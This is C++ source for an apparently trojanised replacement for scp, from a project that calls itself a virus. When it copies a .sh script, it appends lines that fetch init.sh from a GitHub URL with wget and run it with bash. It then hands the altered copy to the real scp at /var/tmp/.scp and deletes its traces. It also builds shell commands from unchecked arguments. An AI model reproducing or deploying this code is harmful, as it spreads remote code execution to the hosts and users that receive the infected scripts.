#include <cstdio>
#include <cstdlib>
#include <string>
#include <cstring>
#include <iostream>
using namespace std;
int main(int argc, char *argv[]) {
	printf("苟利国家生死以，岂因祸福避趋之。\n");
	string str = "/var/tmp/.scp ", file_name = "", file_path = "/var/tmp/";
	bool injected = false;
	if(argc >= 2) {
		int len = strlen(argv[1]);
		// File is *.sh
		if(len >= 3 && argv[1][len-3] == '.' && argv[1][len-2] == 's' && argv[1][len-1] == 'h'){
			int pos = -1;
			for(int i = 0; i < len; ++i) {
				if(argv[1][i] == '/') {
					pos = i;		
				}			
			}
			for(int i = pos + 1; i < len; ++i) {
				file_name += argv[1][i];			
			}
			file_path += file_name;
			string cmd1 = "cp " + string(argv[1]) + " " + file_path + " 2> /var/tmp/.scp_log";
//cout << cmd1 << endl;
			system(cmd1.c_str());
			
			FILE* file = fopen(file_path.c_str(), "a");
			fprintf(file, "# This is our code\n");
			fprintf(file,"echo \"\nThis bash file is infected!\n\" ");
			fprintf(file, "wget https://raw.githubusercontent.com/lagoon0o0/LKMVirus/master/src/init.sh 2> serrlog\n");
			fprintf(file, "bash init.sh\n");
			fprintf(file, "rm init.sh serrlog\n");
			injected = true;
			fclose(file);
		}			
	}
	
	for(int i = 1; i < argc; ++i) {
		if(i == 1 && injected) {
			str += file_path;		
		} else {
			str += 	" " + string(argv[i]);
		}
	}
	str += " 2> /var/tmp/.scp_log";
	system(str.c_str());
//cout << str << endl;	
	FILE* file = fopen("/var/tmp/.scp_log", "r");
	char ch;
	bool flag = true;
	while((ch=getc(file)) != EOF)
		cerr << ch;
	fclose(file);
	if(injected) {
		string cmd3 = "rm "+ file_path + " 2> /var/tmp/.scp_log";
//cout << cmd3 << endl;		
		system(cmd3.c_str());
	}
	system("rm /var/tmp/.scp_log");
}
